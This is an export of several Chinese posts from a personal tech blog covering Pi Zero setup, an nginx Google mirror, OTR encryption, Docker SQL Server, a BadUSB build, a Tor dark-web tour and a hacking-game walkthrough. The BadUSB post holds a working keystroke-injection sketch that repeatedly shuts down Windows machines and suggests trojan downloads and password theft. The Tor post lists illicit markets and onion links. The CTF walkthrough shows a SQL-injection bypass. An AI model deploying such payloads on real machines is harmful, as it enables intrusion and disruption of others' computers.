Pi Zero 无需键盘网络 配置教程","slug":"raspizero","date":"2016-12-17T13:58:26.000Z","updated":"2017-10-26T12:59:55.520Z","comments":true,"path":"2016/12/17/raspizero/","link":"","permalink":"http://www.yfgeek.com/2016/12/17/raspizero/","excerpt":"我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。 上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。","text":"我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。 上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。 请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。 信仰充值滴！信仰充值成功！ 没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。 1Ghz, Single-core CPU 512MB RAM Mini HDMI and USB On-The-Go ports Micro USB power HAT-compatible 40-pin header Composite video and reset headers 不过值得一提的是，USB On-The-Go接口也可以用来供电。 发车网络上关于树莓派Zero如何连接配置大概有以下几种： OTG口转USB 接 USB以太网适配器 OTG口转USB 接 USB Wi-Fi OTG口转USB 接 USB键盘 且 用HDMI接显示器 GPIO接以太网适配器 但是以上，都太麻烦了，对不对？ 那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？ 我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。 1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下： 1234diskutil listdiskutil unmountDisk /dev/SD卡的标号 #如disk2cd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录sudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2 2.刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：1dtoverlay=dwc2 保存文件 3.最后，打开cmdline.txt文件。找到单词rootwait，在其之后添加： 1modules-load=dwc2,g_ether 4.添加一个文件名为ssh到根目录下，内容为空 5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。 6.Ping 一下raspberrypi.local看是否能通 12345PING raspberrypi.local (169.254.70.245): 56 data bytes64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms 7.ssh连接raspberrypi.local，默认密码为raspberry1pi@raspberrypi.local 配置因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。 配置树莓派通过直接运行raspi-config命令 你需要做 容量扩展 更改系统时区 更改系统密码 同时你需要通过执行sudo passwd root更改root密码 安装vnc-server首先，去VNC官网下载最新版本的vnc-server 用scp命令传到树莓派上 1scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz pi@raspberrypi.local:~ 在树莓派shell下，安装VNC12tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gzsudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb 12vncpasswd -user # 设置连接密码vncserver # 启动vncserver 连接raspberry.local:1测试成功 设置代理本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。 那么我们有一个临时解决方案，就是设置代理 首先，在本机搭建一个squid 12brew updatebrew install squid 然后下载SquidMan，安装。在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。 进入树莓派shell，输入：12cd /etc/apt/apt.conf.dsudo vi /etc/apt/apt.conf.d 最后一行加入一句话：1Acquire::http::Proxy &quot;http://Mac.local:8080&quot;; 保存 apt-get update一下，怎么样是不是能装软件了？ 感想这块小板子，我太喜欢了，好精致 参考https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md","categories":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/categories/Raspberry/"}],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/categories/Raspberry/"}]},{"title":"Google镜像站的搭建","slug":"Google镜像站的搭建","date":"2016-12-11T11:21:59.000Z","updated":"2017-10-26T12:59:55.518Z","comments":true,"path":"2016/12/11/Google镜像站的搭建/","link":"","permalink":"http://www.yfgeek.com/2016/12/11/Google镜像站的搭建/","excerpt":"前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。","text":"前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。 教程环境Centos 6 依赖 nginx pcre 正则 ngx_http_proxy_module 反向代理 ngx_http_substitutions_filter_module 多重替换 安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283## 安装 gcc &amp; git#apt-get install build-essential git gcc g++ make## 下载最新版源码# nginx 官网: # http://nginx.org/en/download.html#wget \"http://nginx.org/download/nginx-1.7.8.tar.gz\"## 下载最新版 pcre# pcre 官网:# http://www.pcre.org/#wget \"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz\"## 下载最新版 openssl# opessl 官网:# https://www.openssl.org/#wget \"https://www.openssl.org/source/openssl-1.0.1j.tar.gz\"## 下载最新版 zlib# zlib 官网:# http://www.zlib.net/#wget \"http://zlib.net/zlib-1.2.8.tar.gz\"## 下载本扩展#git clone https://github.com/cuber/ngx_http_google_filter_module## 下载 substitutions 扩展#git clone https://github.com/yaoweibin/ngx_http_substitutions_filter_module## 解压缩#tar xzvf nginx-1.7.8.tar.gztar xzvf pcre-8.38.tar.gztar xzvf openssl-1.0.1j.tar.gztar xzvf zlib-1.2.8.tar.gz## 进入 nginx 源码目录#cd nginx-1.7.8## 设置编译选项#./configure \\ --prefix=/opt/nginx-1.7.8 \\ --with-pcre=../pcre-8.38 \\ --with-openssl=../openssl-1.0.1j \\ --with-zlib=../zlib-1.2.8 \\ --with-http_ssl_module \\ --add-module=../ngx_http_google_filter_module \\ --add-module=../ngx_http_substitutions_filter_module## 编译, 安装# 如果扩展有报错, 请发 issue 到# https://github.com/cuber/ngx_http_google_filter_module/issues#makesudo make install## 启动, 安装过程到此结束#sudo /opt/nginx-1.7.8/sbin/nginxvi /opt/nginx-1.7.8/conf/nginx.conf http配置方式123456789server &#123; server_name &lt;你的域名&gt;; listen 80; resolver 8.8.8.8; location / &#123; google on; &#125;&#125; https配置方式12345678910111213server &#123; server_name &lt;你的域名&gt;; listen 443; ssl on; ssl_certificate &lt;你的证书&gt;; ssl_certificate_key &lt;你的私钥&gt;; resolver 8.8.8.8; location / &#123; google on; &#125;&#125; 随后1234## 配置修改后, 需要 reload nginx 来让配置生效, #sudo /opt/nginx-1.7.8/sbin/nginx -s reload 结果测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。 参考技术https://github.com/cuber/ngx_http_google_filter_module","categories":[{"name":"Ops","slug":"Ops","permalink":"http://www.yfgeek.com/categories/Ops/"}],"tags":[{"name":"Ops","slug":"Ops","permalink":"http://www.yfgeek.com/tags/Ops/"}],"keywords":[{"name":"Ops","slug":"Ops","permalink":"http://www.yfgeek.com/categories/Ops/"}]},{"title":"OTR(Off-the-Record) 技术探讨","slug":"OTR技术探讨","date":"2016-12-06T12:25:59.000Z","updated":"2017-10-26T12:59:55.519Z","comments":true,"path":"2016/12/06/OTR技术探讨/","link":"","permalink":"http://www.yfgeek.com/2016/12/06/OTR技术探讨/","excerpt":"中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。","text":"中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。 通过OTR技术，能够实现: 加密聊天内容 证明与你聊天的人就是与你聊天的人（防止中间人攻击） 服务器无法记录你的真实聊天内容 原理消息鉴别码(MAC)在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。 假设有两个聊天用户，一个叫Alice，一个叫Bob。 例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。 其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。 它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。 过程第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。 Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g A-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x) B-&gt;A: Bob 生成g^y，并且签名SignBob(g^y) SS=g^xy: 生成共享的公钥 第二步，使用公钥加密消息，消息传递。 计算EK=Hash(SS), MK=Hash(EK) A-&gt;B: Encek(M), MAC(Encek(M),MK) Enc采用对称加密算法，比如AES算法用EK作为密钥 Bob 用MK验证MAC, 用EK解密M 保密性和真实性得到了保证 第三步，更新密钥 Alice and Bob 再取一个x’,y’ A-&gt;B: g^x’, MAC(g^x’, MK) B-&gt;A: g^y’, MAC(g^y’, MK) SS’ = H(g^x’y’) EK’ = H(SS’), MK’=H(EK’) 随后，Alice和Bob安全清除掉之前的SS, x, y, EK 第四步，继续保留 MK Alice 和 Bob 并不需要去清除MK 事实上，在他们发下一条消息的时候还用着之前的MK 这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响 从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为： Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方 若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1 M1经由服务器被发送给消息接收方 Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M Awesome OTRs官网: https://otr.cypherpunks.ca/ pidgin-otr: https://otr.cypherpunks.ca/gentoo-install/otr-setup.html JavaScript 实现: https://github.com/arlolra/otr otr.to源代码(JS): https://github.com/OTRMan/otr.to-chat 一个python的otr项目: https://github.com/SpiralP/HexChat-otr otrtalk(JS): https://github.com/mnaamani/otrtalk Facebook的OTR实现Chrome插件:https://github.com/osnr/otron 一个基于OTR技术的P2P聊天系统: https://github.com/mehrvarz/P2pChatOTR 小结研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"Arduino Leonardo 打造 Bad USB","slug":"badusb","date":"2016-11-26T18:48:23.000Z","updated":"2017-10-26T12:59:55.515Z","comments":true,"path":"2016/11/27/badusb/","link":"","permalink":"http://www.yfgeek.com/2016/11/27/badusb/","excerpt":"嘿嘿嘿，又是一篇猥琐小文。","text":"嘿嘿嘿，又是一篇猥琐小文。 简介什么是Bad USB？ BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。 简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。 目标打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。 原料 Arduino Leonardo 普通安卓USB线 举个🌰比如我们要实现一个插入优盘就让对方电脑关机的功能： 用Arduino开发者工具，选择 Arduino Leonardo 然后把程序烧录进去 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;Keyboard.h&gt;void setup() &#123;//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500); Keyboard.press('r');//r键 delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法 Keyboard.release(KEY_CAPS_LOCK); delay(500); Keyboard.println(\"CMD\"); delay(500); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000); Keyboard.println(\"shutdown -s -t 10\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//结束键盘通讯 &#125;void loop()//循环&#123; Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500); Keyboard.press('r');//r键 delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法 Keyboard.release(KEY_CAPS_LOCK); delay(500); Keyboard.println(\"CMD\"); delay(500); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000); Keyboard.println(\"shutdown -s -t 10\"); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//结束键盘通讯 &#125; 已经在多台Windows电脑上试验成功。 效果 进阶当然，你可以实现很多功能 删除系统关键注册表使之蓝屏 留后门 新建用户 用户提权 调用Powershell下载木马 调用Powershell下载木马及从内存中提取出当前用户的Windows密码 rm -rf * 此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。 https://github.com/Xyntax/BadUSB-code 参考http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-deviceshttp://www.freebuf.com/sectool/107242.htmlhttp://www.freebuf.com/articles/terminal/53886.html","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"TOR暗网的秘密","slug":"TOR暗网的秘密","date":"2016-11-25T17:00:34.000Z","updated":"2017-10-26T12:59:55.521Z","comments":true,"path":"2016/11/26/TOR暗网的秘密/","link":"","permalink":"http://www.yfgeek.com/2016/11/26/TOR暗网的秘密/","excerpt":"TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。 以下内容纯属虚构。","text":"TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。 以下内容纯属虚构。 另一个互联网世界Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。 Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。 下面 我们来逛一逛都有什么 奇葩的 py交易。 虚拟主机交易 免费盗版市场盗版书 盗版音乐 英国枪支弹药交易 比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。 （英国持枪是合法的，但是我不感兴趣） 暗网iPhone交易不知道iPhone的货源，很便宜。 办证类美国护照 美国假身份证 英国护照 我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。 博客 此外还有很多，没什么意思 电子邮箱 几乎是全匿名的电子邮箱，用比特message登录的 政治各种资本主义反动派论坛 雇佣黑阔 日一个网站500欧元，还是挺赚的。 其他的当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。 导航站http://dirnxxdraygbifgc.onion/ http://torlinkbgs6aabns.onion/ http://32rfckwuorlf4dlv.onion/ http://torwikignoueupfm.onion/ http://torlinkbgs6aabns.onion/ 搜索引擎http://xmh57jrzrnw6insl.onion/","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"再玩Monyer的Hack Game","slug":"再玩Monyer的Hack-Game","date":"2016-11-23T11:15:20.000Z","updated":"2017-10-26T12:59:55.523Z","comments":true,"path":"2016/11/23/再玩Monyer的Hack-Game/","link":"","permalink":"http://www.yfgeek.com/2016/11/23/再玩Monyer的Hack-Game/","excerpt":"之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。","text":"之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。 第零关http://monyer.com/game/game1/ 请点击链接进入第1关： 连接在左边→ ←连接在右边 可是我们看不到链接地址，直接打开审查工具。 123&lt;span&gt;连接在左边→&lt;/span&gt;&lt;a href=\"first.php\"&gt;&lt;/a&gt;&lt;span&gt;←连接在右边&lt;/span&gt; 好的输入地址，我么进入第一关 第一关http://monyer.com/game/game1/first.php 打开页面依然是什么都没有，这很正常。审查工具看代码。 123456789&lt;script type=\"text/rocketscript\" data-rocketoptimized=\"true\"&gt; function check()&#123; if(document.getElementById('txt').value==\" \")&#123; window.location.href=\"hello.php\"; &#125;else&#123; alert(\"密码错误\"); &#125; &#125;&lt;/script&gt; 好了 我们知道密码了，并且知道下一关的文件是hello.php 第二关http://monyer.com/game/game1/hello.php 审查工具看源代码，head中 1234567891011121314151617181920212223&lt;script type=\"text/rocketscript\" data-rocketoptimized=\"true\"&gt; document.oncontextmenu=function()&#123;return false&#125;; var a,b,c,d,e,f,g; a = 3.14; b = a * 2; c = a + b; d = c / b + a; e = c - d * b + a; f = e + d /c -b * a; g = f * e - d + c * b + a; a = g * g; a = Math.floor(a); function check()&#123; if(document.getElementById(\"txt\").value==a)&#123; window.location.href=a + \".php\"; &#125;else&#123; alert(\"密码错误\"); return false; &#125; &#125;&lt;/script&gt; 现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入123456789101112var a,b,c,d,e,f,g; a = 3.14; b = a * 2; c = a + b; d = c / b + a; e = c - d * b + a; f = e + d /c -b * a; g = f * e - d + c * b + a; a = g * g; a = Math.floor(a); 424178 好的我们知道a的值是424178，输入，进入下一关 第三关http://monyer.com/game/game1/424178.php head中存在js 123&lt;script type=\"text/rocketscript\" data-rocketoptimized=\"true\"&gt; eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));&lt;/script&gt; 新时代无须解释，直接上chrome consle1String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125) 输出为12345678function check()&#123; var a = 'd4g'; if(document.getElementById('txt').value==a)&#123; window.location.href=a+\".php\"; &#125;else&#123; alert(\"密码错误\"); &#125;&#125; 好了我们知道了，密码是d4g，下一关！ 第四关http://monyer.com/game/game1/d4g.php 这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。打开后立即按esc停止。 123&lt;script type=\"text/rocketscript\" data-rocketoptimized=\"true\"&gt; eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return c.toString(36)&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p&#125;('a=\"e\";d c()&#123;b(9.8(\\'7\\').6==a)&#123;5.4.3=a+\".2\"&#125;1&#123;0(\"密码错误\")&#125;&#125;',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,&#123;&#125;))&lt;/script&gt; 显然这是一个加密的js，我们需要解密，上解密工具： http://tool.lu/js/ 解密后： 123456789a = \"3bhe\";function check() &#123; if (document.getElementById('txt').value == a) &#123; window.location.href = a + \".php\" &#125; else &#123; alert(\"密码错误\") &#125;&#125; 密码是 3bhe 下一关 诶？怎么不对？仔细检查源代码发现下面还有一行1eval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\"); 解密！1a = a.toUpperCase() + 1; .toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go 第五关http://monyer.com/game/game1/3BHE1.php 密码在哪儿？额，我藏在页面里了哦！ 这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？ 找到了，在cookie里 1monyer:the password for the next level is asdf 下一关！ 第六关http://monyer.com/game/game1/asdf.php 是个线索题目 Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls … 真蛋疼把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。 这个答案是；seventeen 第七关http://monyer.com/game/game1/seventeen7.php 社工题 先解密md5吧 5e023995fb3f5e840ee684784f8f0799 http://www.somd5.com/ 解密出 eighteen8 下一关 第八关http://monyer.com/game/game1/eighteen8.php 直接看到 一个404 不要着急 审查工具 12345678910&lt;p style=&quot;display:none&quot;&gt;第8关朋友您好，第8关欢迎您！我对您的聪明才智感到惊讶！相信我，现在世界上85%以上的人都在你之下，所以你可以大步向前，义无反顾地进行你的事业了。因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。那么继续我们的约定，我将告诉你第9关的入口：10000以内所有质数和.php&lt;/p&gt; 10000以内所有质数和，so easy！写个javascript 算一下。 1234567891011var sum = 0;for (var i = 2; i &lt; 10000; i++) &#123; var flag = true; for (var j = 2; j &lt;= Math.sqrt(i); j++) &#123; if (i % j == 0) flag = false ; &#125; if(flag) &#123;sum = sum + i;&#125;&#125;console.log(sum);5736396 下一关 第九关http://monyer.com/game/game1/5736396.php 在命令行里输入：12wget http://monyer.com/game/game1/img/4681851790659554.jpgcat 4681851790659554.jpg 密码藏在图片里1234567���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ������Ǿ���ʽ�ʲô���ţ��ԣ�������������������......����ϲ�㣡��ʮ������Ϊ��MonyerLikeYou_the10level�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ������Լ���û��ģ�% MonyerLikeYou_the10level 第十关http://monyer.com/game/game1/MonyerLikeYou_the10level.php 当前用户身份为simpleuser 不是admin，无法显示下一关密码 很显然这是一道session/cookie欺骗题 在console里直接输入1document.cookie=&quot;username=admin&quot; 刷新 好聪明哦！下一关密码为：doyouknow 下一关！ 第十一关http://monyer.com/game/game1/doyouknow.php?action=show_login_false 你的session不是passer，不能查看下一关密码 在console里直接输入1document.cookie=&quot;username=passer&quot; 刷新，好像不对哦，monyer骗我，哼！ 再看标题 action=show_login_false http://monyer.com/game/game1/doyouknow.php?action=show_login_true 您的session为passer，所以您可以查看下一关密码：smartboy 下一关！ 第十二关http://monyer.com/game/game1/smartboy.php 1JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3 直觉告诉我，这显然是Base64 解密1%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77 直觉告诉我，这显然是 UrlEncode 解密 JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw 直觉再次告诉我，这显然是 Base64 解密 %73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70 直觉再次告诉我，这显然是 UrlEncode 解密 sobeautiful.php 不错 密码就是sobeautiful 第十三关http://monyer.com/game/game1/sobeautiful.php 本页禁止盗链！ wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入： 1&lt;a href= \"http://monyer.com/game/game1/sobeautiful.php\"&gt; 简便伪造referer&lt;/a&gt; 欢迎您来到第13关 请输入密码进入第14关： 没有输入密码 或 密码错误 或 系统错误！ 看源代码有post提交 这是一道SQL 注入题 试试我大万能密码！1&apos; or 1=1 万能密码熟记于心 下一关密码：whatyouneverknow 下一关！ 第十四关http://monyer.com/game/game1/whatyouneverknow.php 感谢@Echowxsy提供第14关解密过程 第十五关","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"Docker下配置SQL Server for Linux","slug":"docker-SQLServer","date":"2016-11-22T06:44:06.000Z","updated":"2017-10-26T12:59:55.523Z","comments":true,"path":"2016/11/22/docker-SQLServer/","link":"","permalink":"http://www.yfgeek.com/2016/11/22/docker-SQLServer/","excerpt":"前言微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。 Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」","text":"前言微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。 Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」 配置要求 Docker版本在 1.8 以上 至少 4GB 硬盘空间 至少 4GB 内存 配置拉取docker镜像1docker pull microsoft/mssql-server-linux 运行docker镜像YourStrong!Passw0rd 为你的密码 1433 为对外端口1docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux 🌰 例子1sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux 设置 宿主机保存数据目录(暂不支持)&lt;host directory&gt; 为目录 1docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux 查看容器的ip(调试用)1docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id 172.17.0.2 连接用户名是SA 密码是用户自己设置的 连接成功！ 最后内存占用情况 我们一起默念 微软大法好 微软大法好 微软大法好 。 谢谢微软为开源世界做的一切！ 